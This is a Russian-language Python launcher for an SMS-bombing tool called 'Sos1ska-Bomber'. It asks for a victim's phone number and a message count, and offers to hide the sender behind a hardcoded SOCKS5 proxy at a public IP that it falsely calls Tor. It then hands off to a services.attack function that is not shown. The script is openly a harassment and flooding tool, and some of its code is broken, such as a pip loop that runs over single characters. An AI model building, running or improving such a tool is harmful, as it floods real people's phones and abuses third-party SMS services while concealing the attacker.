try:
	import requests
except:
	print(f"У вас не установлен requests, для его установки введите pip install requests")
import services
import os

input("Начнется проверка компонентов, для продолжения нажмите Enter")
print("Начинаю проверку компонентов")
mod = ("--update pip")
for i in range(len(mod)):
	os.system("pip install "+mod[i])
	os.system("clear")


# Цвета
Red = '\033[91m'
Green = '\033[92m'
Blue = '\033[94m'
Cyan = '\033[96m'
White = '\033[97m'
Yellow = '\033[93m'
Magenta = '\033[95m'
Grey = '\033[90m'
Black = '\033[90m'
Default = '\033[99m'
Underline = '\033[4m'
end       = '\033[0m'

print(f"{Yellow}{Red}\t\t{Underline}[Sos1ska-Bomber 1.0 RU Version]{end}")

print()
print(f"{Default}Код написан{end}", end="")
print(f"{Green} >>> {end}", end="")
print(f"{Red}Sos1ska-Hackers{end}")

print(f"{Default}ВКонтакте", end="")
print(f"{Green} >>> {end}", end="")
print(f"{Default}https://vk.com/nikitasos1ska{end}", end="")
print(f"{Default}Почта", end="")
print(f"{Green} >>> {end}", end="")
print(f"{Default}soshack00@gmail.com{end}", end="")
print()

# Установка номера телефона, а также кол-во смс
print(f"{Default}Введите номер телефона{Red}ВНИМАНИЕ номер должен содержать +7 или 8{Default}")
input_number = input(Green + ">> "+ end)
print('Кол-во смс?')
sms = int(input(Green + ">> " + end))

# Преложение от СМС-атаки через Tor
print(f"Хотите ли вы использовать {Magenta} Tor {end}Y/N? ")
is_tor = input(Green + ">> " + end)

# Проверка номера

def parse_number(number):
	msg = f"[*]Проверка номера - {Green}Номер правильный!{end}"
	if len(number) in (10, 11, 12):
		if number[0] == "8":
			number = number[1:]
			print(msg)
		elif number[:2] == "+7":
			number = number[2:]
			print(msg)
		elif int(len(number)) == 10 and number[0] == 9:
			print(msg)
	else:
		print(f"[*]Проверка номера - {Red}Номер введён не правильно, проверьте номер телефона{end}")
		quit()
	return number
number = parse_number(input_number)

# Tor
if str(is_tor) == "Y":
	print(f"[*]Запускаю {Red}Tor{end}...")
	proxies = {
		'http': 'socks5://139.59.53.105:1080',
		'https': 'socks5://139.59.53.105:1080'
	}
	tor = requests.get('http://icanhazip.com/', proxies=proxies).text
	tor = (tor.replace('\n', ''))
	print(f"[*]Запуск {Red}Tor{end} - {Green}Завершено {end}Вы в безопасности")

services.attack(number, sms)
